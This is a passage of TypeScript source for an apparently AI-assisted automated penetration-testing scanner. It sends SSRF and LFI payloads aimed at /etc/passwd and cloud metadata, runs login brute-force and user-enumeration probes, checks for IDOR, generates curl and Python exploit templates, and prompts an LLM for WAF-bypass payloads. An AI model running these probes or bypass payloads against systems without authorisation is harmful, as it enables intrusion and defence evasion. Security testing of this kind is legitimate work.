              poc: `curl -X ${form.method} "${formUrl}" -d "${input.name}=${encodeURIComponent(payload)}"`,
              exploitCode: `# SQL Injection exploit\nimport requests\nurl = "${formUrl}"\ndata = {"${input.name}": "${payload}"}\nresp = requests.${form.method.toLowerCase()}(url, data=data)\nprint(resp.text)`
            });
            break;
          }
        } catch {}
      }
    }
  }

  // Test URL parameters
  for (const param of params.slice(0, 10)) {
    // SSRF Testing
    for (const payload of payloads.ssrf.slice(0, 2)) {
      try {
        const testUrl = new URL(target.toString());
        testUrl.searchParams.set(param, payload);
        const response = await fetchWithTimeout(testUrl.toString(), 10000);
        const responseText = await response.text();
        
        if (responseText.includes('root:') || responseText.includes('ami-id') || responseText.includes('instance-id')) {
          findings.push({
            id: `SSRF-${Date.now()}`,
            severity: 'critical',
            title: 'Server-Side Request Forgery (SSRF)',
            description: `Parameter "${param}" vulnerable to SSRF`,
            endpoint: testUrl.toString(),
            method: 'GET',
            payload,
            evidence: 'Internal resource accessed',
            response: responseText.slice(0, 500),
            remediation: 'Validate and sanitize URL inputs',
            cwe: 'CWE-918',
            cvss: 9.0,
            mitre: ['T1552.005'],
            confidence: 90,
            poc: `curl "${testUrl.toString()}"`
          });
        }
      } catch {}
    }

    // LFI Testing
    for (const payload of payloads.lfi.slice(0, 2)) {
      try {
        const testUrl = new URL(target.toString());
        testUrl.searchParams.set(param, payload);
        const response = await fetchWithTimeout(testUrl.toString(), 10000);
        const responseText = await response.text();
        
        if (responseText.includes('root:x:0:0') || responseText.includes('/bin/bash')) {
          findings.push({
            id: `LFI-${Date.now()}`,
            severity: 'critical',
            title: 'Local File Inclusion (LFI)',
            description: `Parameter "${param}" vulnerable to LFI`,
            endpoint: testUrl.toString(),
            method: 'GET',
            payload,
            evidence: '/etc/passwd content visible',
            response: responseText.slice(0, 500),
            remediation: 'Validate file paths, use allowlists',
            cwe: 'CWE-22',
            cvss: 9.0,
            mitre: ['T1083'],
            confidence: 95,
            poc: `curl "${testUrl.toString()}"`
          });
        }
      } catch {}
    }
  }

  return findings;
}

// Authentication testing
async function testAuthentication(target: URL, authEndpoints: string[]): Promise<Finding[]> {
  const findings: Finding[] = [];
  const endpointsToTest = authEndpoints.length > 0 ? authEndpoints : 
    ['/login', '/signin', '/auth', '/api/login', '/api/auth'].map(p => new URL(p, target).toString());

  for (const endpoint of endpointsToTest.slice(0, 5)) {
    try {
      // Test for user enumeration
      const testCredentials = [
        { user: 'admin', pass: 'wrongpassword123' },
        { user: 'nonexistentuser12345', pass: 'wrongpassword123' }
      ];

      const responses: string[] = [];
      for (const cred of testCredentials) {
        try {
      const response = await fetchWithTimeout(endpoint, 15000, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `username=${cred.user}&password=${cred.pass}`
          });
          const body = await response.text();
          responses.push(body.toLowerCase());
        } catch {}
      }

      if (responses.length === 2 && responses[0] !== responses[1]) {
        if (responses[1].includes('not found') || responses[1].includes('invalid user') || 
            responses[1].includes("doesn't exist") || responses[0].includes('invalid password')) {
          findings.push({
            id: `AUTH-ENUM-${Date.now()}`,
            severity: 'medium',
            title: 'User Enumeration via Different Error Messages',
            description: 'Login reveals whether username exists',
            endpoint,
            method: 'POST',
            evidence: 'Different error messages for existing vs non-existing users',
            remediation: 'Use generic error messages',
            cwe: 'CWE-204',
            confidence: 80,
            poc: `# User enumeration\ncurl -X POST "${endpoint}" -d "username=admin&password=wrong"\ncurl -X POST "${endpoint}" -d "username=nonexistent&password=wrong"`
          });
        }
      }

      // Test brute force protection
      let blockedAt = 0;
      for (let i = 0; i < 15; i++) {
        try {
          const response = await fetchWithTimeout(endpoint, 5000, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `username=admin&password=attempt${i}`
          });
          if (response.status === 429 || response.status === 423) {
            blockedAt = i + 1;
            break;
          }
        } catch { break; }
      }

      if (blockedAt === 0) {
        findings.push({
          id: `AUTH-BRUTEFORCE-${Date.now()}`,
          severity: 'high',
          title: 'No Brute Force Protection',
          description: '15+ failed login attempts without lockout or rate limiting',
          endpoint,
          method: 'POST',
          evidence: 'No 429 or lockout response after 15 attempts',
          remediation: 'Implement account lockout and rate limiting',
          cwe: 'CWE-307',
          cvss: 7.5,
          mitre: ['T1110'],
          confidence: 85,
          poc: `# Brute force test\nfor i in {1..15}; do curl -X POST "${endpoint}" -d "username=admin&password=test$i"; done`
        });
      }
    } catch {}
  }

  return findings;
}

// Business logic testing
async function testBusinessLogic(target: URL, workflows: string[]): Promise<Finding[]> {
  const findings: Finding[] = [];

  // Test for IDOR in common patterns
  const idorPaths = ['/user/', '/profile/', '/account/', '/order/', '/invoice/', '/document/'];
  
  for (const path of idorPaths) {
    try {
      // Test with ID 1 and 2
      const url1 = new URL(`${path}1`, target).toString();
      const url2 = new URL(`${path}2`, target).toString();
      
      const [resp1, resp2] = await Promise.all([
        fetchWithTimeout(url1, 5000).catch(() => null),
        fetchWithTimeout(url2, 5000).catch(() => null)
      ]);

      if (resp1?.status === 200 && resp2?.status === 200) {
        findings.push({
          id: `IDOR-${Date.now()}`,
          severity: 'high',
          title: `Potential IDOR at ${path}`,
          description: 'Sequential IDs accessible without proper authorization check',
          endpoint: url1,
          method: 'GET',
          evidence: `Both ${url1} and ${url2} returned 200`,
          remediation: 'Implement proper authorization checks',
          cwe: 'CWE-639',
          cvss: 7.5,
          mitre: ['T1078'],
          confidence: 70,
          poc: `curl "${url1}"\ncurl "${url2}"`
        });
      }
    } catch {}
  }

  return findings;
}

// AI correlation and attack path analysis
async function performAICorrelation(
  findings: Finding[],
  discovery: any,
  fingerprint: any,
  apiKey: string | undefined
): Promise<any> {
  if (!apiKey || findings.length === 0) {
    return { attackPaths: [], chainedExploits: [], recommendations: ['Implement security headers'] };
  }

  try {
    const response = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${apiKey}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          {
            role: "system",
            content: `You are a senior penetration tester analyzing vulnerability findings. Identify attack paths, chained exploits, and prioritized recommendations. Return JSON only.`
          },
          {
            role: "user",
            content: `Findings: ${JSON.stringify(findings.slice(0, 20))}\n\nTechnologies: ${fingerprint.technologies.join(', ')}\n\nAnalyze and return: {"attackPaths": [{"name": "...", "steps": [...], "impact": "..."}], "chainedExploits": [{"vulnerabilities": [...], "exploitation": "..."}], "recommendations": ["..."]}`
          }
        ],
        temperature: 0.3
      }),
    });

    if (response.ok) {
      const data = await response.json();
      const content = data.choices?.[0]?.message?.content || '';
      const jsonMatch = content.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        return JSON.parse(jsonMatch[0]);
      }
    }
  } catch (e) {
    console.log('AI correlation failed:', e);
  }

  return {
    attackPaths: findings.filter(f => f.severity === 'critical').map(f => ({
      name: f.title,
      steps: [f.description],
      impact: 'High - requires immediate attention'
    })),
    chainedExploits: [],
    recommendations: [
      'Remediate critical vulnerabilities immediately',
      'Implement security headers',
      'Enable WAF protection',
      'Review authentication mechanisms'
    ]
  };
}

// Generate POC for exploits
async function generateExploitPOC(findings: Finding[], apiKey: string | undefined): Promise<Finding[]> {
  if (!apiKey) return findings;

  for (const finding of findings) {
    if (!finding.poc) {
      finding.poc = `# ${finding.title} POC\ncurl -X ${finding.method || 'GET'} "${finding.endpoint}"${finding.payload ? ` -d "${finding.payload}"` : ''}`;
    }
    if (!finding.exploitCode && (finding.severity === 'critical' || finding.severity === 'high')) {
      finding.exploitCode = `#!/usr/bin/env python3
# Exploit for: ${finding.title}
# Target: ${finding.endpoint}
# CWE: ${finding.cwe || 'N/A'}

import requests

def exploit():
    url = "${finding.endpoint}"
    ${finding.payload ? `payload = "${finding.payload}"` : 'payload = None'}
    
    response = requests.${(finding.method || 'GET').toLowerCase()}(url${finding.payload ? ', data=payload' : ''})
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text[:500]}")
    
    return response.status_code == 200

if __name__ == "__main__":
    exploit()
`;
    }
  }

  return findings;
}

// AI-powered false positive reduction
async function reduceFalsePositives(
  findings: Finding[],
  previousFindings: any[],
  apiKey: string | undefined
): Promise<Finding[]> {
  if (!apiKey) return findings;

  // Mark known false positives
  const knownFPs = previousFindings.filter(f => f.falsePositive).map(f => f.id);
  
  for (const finding of findings) {
    // Check if similar finding was marked as FP before
    if (knownFPs.some(fp => fp.includes(finding.id.split('-')[0]))) {
      finding.falsePositive = true;
      finding.confidence = Math.max(finding.confidence - 30, 10);
    }

    // Lower confidence for info-level findings
    if (finding.severity === 'info') {
      finding.confidence = Math.min(finding.confidence, 60);
    }

    // Lower confidence if no real evidence
    if (!finding.response && !finding.evidence) {
      finding.confidence = Math.min(finding.confidence, 50);
    }
  }

  return findings;
}

// Save learning data
async function saveLearningData(
  supabase: any,
  hostname: string,
  findings: Finding[],
  learningData: LearningData[]
): Promise<void> {
  try {
    // Save successful findings for future learning
    for (const finding of findings.filter(f => !f.falsePositive && f.confidence > 70)) {
      await supabase.from('vapt_test_actions').insert({
        target_url: finding.endpoint,
        domain: hostname,
        method: finding.method || 'GET',
        test_type: finding.id.split('-')[0].toLowerCase(),
        payload_sent: finding.payload,
        outcome_label: 'success',
        notes: finding.title,
        embedding_text: `${finding.title} ${finding.description} ${finding.cwe || ''}`
      });
    }
  } catch (e) {
    console.log('Failed to save learning data:', e);
  }
}

// Generate AI payloads based on failed attempts
async function generateAIPayloads(
  apiKey: string,
  failedPayloads: string[],
  target: string
): Promise<any> {
  try {
    const response = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${apiKey}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          {
            role: "system",
            content: "You are a security researcher generating WAF bypass payloads. Generate NEW payloads using different encoding/obfuscation."
          },
          {
            role: "user",
            content: `Target: ${target}\nBlocked payloads: ${failedPayloads.slice(0, 10).join(', ')}\n\nGenerate 5 NEW bypass payloads for each category. Return JSON: {"xss": [...], "sqli": [...], "ssrf": [...], "lfi": [...]}`
          }
        ],
        temperature: 0.7
      }),
    });

    if (response.ok) {
      const data = await response.json();
      const content = data.choices?.[0]?.message?.content || '';
      const jsonMatch = content.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        return JSON.parse(jsonMatch[0]);
      }
    }
  } catch {}
  return null;
}

// Utility: Fetch with timeout
async function fetchWithTimeout(
  url: string,
  timeout: number,
  options?: RequestInit
): Promise<Response> {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal,
      headers: {
        "User-Agent": "OmniSec Autonomous VAPT/3.0",
        ...(options?.headers || {})
      }
    });
    clearTimeout(timeoutId);
    return response;
  } catch (e) {
    clearTimeout(timeoutId);
    throw e;
  }
}
